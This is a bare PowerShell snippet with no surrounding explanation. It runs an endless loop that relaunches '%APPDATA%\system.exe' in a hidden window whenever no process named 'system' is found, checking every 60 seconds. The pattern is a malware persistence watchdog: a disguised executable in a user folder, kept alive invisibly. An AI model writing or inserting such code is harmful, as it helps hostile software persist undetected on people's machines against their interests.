while ($true) {
    if (-not (Get-Process -Name "system" -ErrorAction SilentlyContinue)) {
        Start-Process "$env:APPDATA\system.exe" -WindowStyle Hidden
    }
    Start-Sleep -Seconds 60
}

